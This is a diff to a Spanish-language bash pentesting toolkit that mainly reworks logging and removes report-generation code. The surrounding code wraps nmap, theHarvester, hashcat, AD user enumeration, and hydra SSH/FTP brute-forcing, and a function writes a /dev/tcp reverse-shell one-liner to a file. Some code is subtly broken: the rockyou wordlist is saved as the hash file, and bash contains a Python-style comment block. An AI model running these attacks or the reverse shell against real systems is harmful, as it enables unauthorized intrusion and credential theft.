@@ -96,13 +96,13 @@ function submenu_enumeracion() {
 }
 
 function nmap_scan_rapido() {
-    nmap_log="$ssesion_dir/nmap_scan_rapido_$(date +"%Y-%m-%d_%H-%M").txt" 
+    nmap_log="$session_dir/nmap_scan_rapido_$(date +"%Y-%m-%d_%H-%M").txt" 
     read -p "Ingresa la IP o rango a escanear: " ip
     echo "Ejecutando Nmap scan rápido en $ip..." | tee -a "$nmap_log"
     sudo nmap -sP $ip | tee -a "$nmap_log"
     
-    echo "Generando reporte..." | tee -a "$nmap_log"
-    generar_reporte "Nmap_scanner"
+    echo "Generando reporte..." | tee -a "$session_log"
+    echo "Nmap scan rápido ejecutado en $ip" >> "$session_log"
     read -p "Presiona Enter para continuar..." && submenu_enumeracion
 }
 
@@ -112,8 +112,8 @@ function nmap_scan_puertos() {
     echo "Ejecutando Nmap scan de puertos en $ip..." | tee -a "$nmap_ports_log"
     sudo nmap -sS $ip | tee -a "$nmap_ports_log"
     
-    echo "Generando reporte..." | tee -a "$nmap_ports_log"
-    generar_reporte "Nmap_port_scanner"
+    echo "Generando reporte..." | tee -a "$session_log"
+    echo "Nmap scan de puertos ejecutado en $ip" >> "$session_log"
     read -p "Presiona Enter para continuar..." && submenu_enumeracion
 }
 
@@ -123,8 +123,8 @@ function osint_harvester() {
     echo "Ejecutando TheHarvester en $dominio..." | tee -a "$osint_log"
     sudo theHarvester -d $dominio -l 500 -b all | tee -a "$osint_log"
     
-    echo "Generando reporte..." | tee -a "$osint_log"
-    generar_reporte "Harvester"
+    echo "Generando reporte..." | tee -a "$session_log"
+    echo "OSINT ejecutado en $dominio" >> "$session_log"
     read -p "Presiona Enter para continuar..." && submenu_enumeracion
 }
 
@@ -155,13 +155,12 @@ function descargar_y_generar_hashes() {
     echo "Descargando lista de hashes por defecto..."
     curl -o "$session_dir/hash.txt" "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou.txt"
     echo "Lista de hashes descargada como hash.txt."
-    
+
     echo "Ejecutando Hashcat..." | tee -a "$session_log"
     if sudo hashcat -m 0 "$session_dir/hash.txt" "$session_dir/rockyou.txt" | tee -a "$session_log"; then
-        echo "Herramientas ejecutadas con éxito. Generando reporte..."
-        generar_reporte "Hash_generator"
+        echo "Hashcat ejecutado con éxito." | tee -a "$session_log"
     else
-        echo "Error al ejecutar Hashcat."
+        echo "Error al ejecutar Hashcat." | tee -a "$session_log"
     fi
 }
 
@@ -171,11 +170,10 @@ function cargar_hashes() {
     if [ -f "$ruta_archivo" ]; then
         cp "$ruta_archivo" "$session_dir/hash.txt" 
         echo "Hashes cargados desde $ruta_archivo." | tee -a "$session_log"
-        
+
         echo "Ejecutando Hashcat..." | tee -a "$session_log"
         sudo hashcat -m 0 "$session_dir/hash.txt" "$session_dir/rockyou.txt" | tee -a "$session_log"
-        echo "Generando reporte..." | tee -a "$session_log"
-        generar_reporte "Hash_upload"
+        echo "Hashcat ejecutado en $ruta_archivo." | tee -a "$session_log"
     else
         echo "El archivo no existe. Por favor verifica la ruta." | tee -a "$session_log"
     fi
@@ -187,10 +185,8 @@ function crackear_hash() {
     read -p "Ingresa el wordlist a usar: " wordlist
     echo "Ejecutando Hashcat en $archivo con la wordlist $wordlist..." | tee -a "$hashcat_log"
     sudo hashcat -a 0 -m 0 "$archivo" "$wordlist" | tee -a "$hashcat_log"
-    
-    echo "Hashcat ejecutado en $archivo con wordlist $wordlist" >> "$hashcat_log"
-    echo "Generando reporte..." | tee -a "$hashcat_log"
-    generar_reporte "Hash_cracking"
+
+    echo "Hashcat ejecutado en $archivo con la wordlist $wordlist." | tee -a "$session_log"
     read -p "Presiona Enter para continuar..." && submenu_hashes
 }
 
@@ -198,9 +194,9 @@ function detectar_tipo_hash() {
     hash_log="$session_dir/hash_detection_log_$(date +"%Y-%m-%d_%H-%M").txt"
     read -p "Ingresa el hash: " hash
     sudo hashid -m "$hash" | tee -a "$hash_log"
-    echo "Tipo de hash detectado: $hash" >> "$hash_log"
-    echo "Generando reporte..." | tee -a "$hash_log"
-    generar_reporte "Hash_detection"
+    echo "Tipo de hash detectado: $hash" | tee -a "$hash_log"
+
+    echo "Hash detectado: $hash" | tee -a "$session_log"
     read -p "Presiona Enter para continuar..." && submenu_hashes
 }
 
@@ -243,9 +239,8 @@ function crear_reverse_shell() {
     read -p "Ingresa el puerto: " puerto
     echo "bash -i >& /dev/tcp/$ip/$puerto 0>&1" > reverse_shell.sh
     echo "Reverse shell creado en reverse_shell.sh" | tee -a "$session_log"
-    echo "Reverse shell creado (IP: $ip, Puerto: $puerto)" >> "$session_log"
-    echo "Generando reporte..." | tee -a "$session_log"
-    generar_reporte "Reverse_shell"
+    echo "Reverse shell creado (IP: $ip, Puerto: $puerto)" | tee -a "$session_log"
+
     read -p "Presiona Enter para continuar..." && submenu_payloads
 }
 
@@ -319,8 +314,7 @@ function enumerar_usuarios_ad() {
     read -s -p "Ingresa la contraseña: " password
     echo
     sudo python3 GetADUsers.py -dc-ip "$dc_ip" "$dominio/$usuario:$password" | tee -a "$enum_log"
-    echo "Usuarios enumerados desde $dc_ip" >> "$enum_log"
-    generar_reporte "User_enumerate"
+    echo "Usuarios enumerados desde $dc_ip. Detalles guardados en $enum_log." | tee -a "$session_log"
     read -p "Presiona Enter para continuar..." && submenu_ad
 }
 
@@ -370,14 +364,11 @@ function ataque_ssh() {
     sudo hydra -L "$usuarios" -P "$contrasenas" -t 4 ssh://"$ip" -o "$ssh_log"
     
     if [ -f "$ssh_log" ] && grep -q "login:" "$ssh_log"; then
-        echo "Ataque SSH exitoso en $ip. Detalles guardados en $ssh_log."
+        echo "Ataque SSH exitoso en $ip. Detalles guardados en $ssh_log." | tee -a "$session_log"
     else
-        echo "Ataque SSH fallido en $ip. Detalles guardados en $ssh_log."
+        echo "Ataque SSH fallido en $ip. Detalles guardados en $ssh_log." | tee -a "$session_log"
     fi
     
-    echo "Ataque SSH ejecutado en $ip usando $usuarios y $contrasenas. Ver detalles en $ssh_log." >> "$session_log"
-    
-    generar_reporte "SSH_attack"
     read -p "Presiona Enter para continuar..." && submenu_fuerza_bruta
 }
 
@@ -392,14 +383,13 @@ function ataque_ftp() {
         return
     fi
 
-    if [ ! -f "$contrasenas" ]; then
+    if [ ! -f "$contrasenas" ];then
         echo "El archivo de contraseñas no existe."
         return
     fi
 
     sudo hydra -L "$usuarios" -P "$contrasenas" ftp://"$ip" -o "$ftp_log"
-    echo "Ataque FTP ejecutado en $ip usando $usuarios y $contrasenas. Ver detalles en $ftp_log." >> "$session_log"
-    generar_reporte "FTP_attack"
+    echo "Ataque FTP ejecutado en $ip usando $usuarios y $contrasenas. Detalles guardados en $ftp_log." | tee -a "$session_log"
     read -p "Presiona Enter para continuar..." && submenu_fuerza_bruta
 }
 
@@ -424,8 +414,7 @@ function escanear_subdominios() {
     subdomain_log="$session_dir/subdomain_scan_log_$(date +"%Y-%m-%d_%H-%M").txt"
     read -p "Ingresa el dominio objetivo: " dominio
     sudo sublist3r -d "$dominio" | tee -a "$subdomain_log"
-    echo "Escaneo de subdominios ejecutado para $dominio. Ver detalles en $subdomain_log." >> "$session_log"
-    generar_reporte "Subdomain_scanner"
+    echo "Escaneo de subdominios ejecutado para $dominio. Detalles guardados en $subdomain_log." | tee -a "$session_log"
     read -p "Presiona Enter para continuar..." && submenu_subdominios
 }
 
@@ -450,132 +439,6 @@ function generar_reporte_general() {
 
     echo "Reporte general generado: $report_name"
 }
-
-''' Comentamos por ahora
-function generar_reporte() {
-    local herramienta="$1" 
-
-    local herramienta_dir="reportes/${herramienta}/$(date +"%Y-%m-%d")"
-    mkdir -p "$herramienta_dir"
-
-    local report_name="$herramienta_dir/reporte_${herramienta}_$(date +"%H-%M").txt"
-
-    {
-        echo "==== Reporte de Pentesting ===="
-        echo "Fecha: $(date +"%Y-%m-%d %H:%M:%S")"
-        echo "Nombre del Pentester: $USER"
-        echo "Sistema objetivo: $target_ip"
-        echo ""
-
-        for log_file in "$session_dir"/*; do
-            echo "==== Resultados de $(basename "$log_file") ===="
-            if [ -s "$log_file" ]; then
-                cat "$log_file"
-            else
-                echo "No se encontraron resultados."
-            fi
-            echo ""
-        done
-
-        echo "==== Análisis de Resultados ===="
-        echo "Automatización del análisis: Se recomienda revisar las vulnerabilidades."
-        echo ""
-
-        echo "==== Recomendaciones ===="
-        echo "Revisión de configuraciones de firewall."
-    } > "$report_name"
-
-    echo "Reporte generado y almacenado en: $report_name"
-
-    echo "Proceso completado. Presiona Enter para continuar..."
-    read -r
-
-    menu_principal
-}
-
-function listar_reportes() {
-    local herramienta="$1"
-    local reportes_dir="reportes/$herramienta"
-    reportes=($(find "$reportes_dir" -type f))
-
-    if [ ${#reportes[@]} -eq 0 ]; then
-        echo "No se encontraron reportes para la herramienta $herramienta."
-        return 1
-    fi
-
-    echo "Reportes disponibles para $herramienta:"
-    select reporte in "${reportes[@]}"; do
-        if [[ -n "$reporte" && -f "$reporte" ]]; then
-            echo "$reporte"
-            return 0
-        else
-            echo "Opción inválida. Intenta de nuevo."
-        fi
-    done
-}
-
-function unificar_reportes() {
-    echo "Unificando reportes..."
-
-    echo "Selecciona una herramienta:"
-    select herramienta in $(ls reportes); do
-        if [ -n "$herramienta" ]; then
-            break
-        else
-            echo "Opción inválida. Intenta de nuevo."
-        fi
-    done
-
-    reportes_seleccionados=()
-
-    while true; do
-        reporte=$(listar_reportes "$herramienta")
-        
-        if [ $? -eq 1 ]; then
-            return
-        fi
-
-        reportes_seleccionados+=("$reporte")
-        echo "Has seleccionado: $reporte"
-
-        read -p "¿Deseas seleccionar otro reporte de la misma herramienta? (s/n): " continuar
-        if [[ "$continuar" != "s" ]]; then
-            break
-        fi
-    done
-
-    if [ ${#reportes_seleccionados[@]} -eq 0 ]; then
-        echo "No se seleccionó ningún reporte para unificar."
-        return
-    fi
-
-    local reporte_unificado="reportes_unificados/reporte_unificado_$(date +"%Y-%m-%d_%H-%M").txt"
-    mkdir -p "reportes_unificados"
-
-    {
-        echo "==== Reporte Unificado ===="
-        echo "Fecha: $(date +"%Y-%m-%d %H:%M:%S")"
-        echo "Nombre del Pentester: $USER"
-        echo ""
-        for reporte in "${reportes_seleccionados[@]}"; do
-            echo "==== Contenido de $reporte ===="
-            cat "$reporte"
-            echo ""
-        done
-    } > "$reporte_unificado"
-
-    if [ -s "$reporte_unificado" ]; then
-        echo "Reporte unificado generado: $reporte_unificado"
-    else
-        echo "Error: El reporte unificado está vacío o falló la unificación."
-    fi
-
-    echo "Proceso de unificación completado. Presiona Enter para continuar..."
-    read -r
-    menu_principal
-}
-'''
-
 
 function ejecutar_herramientas() {
     echo "Iniciando la ejecución automatizada de herramientas..." | tee -a "$session_log"
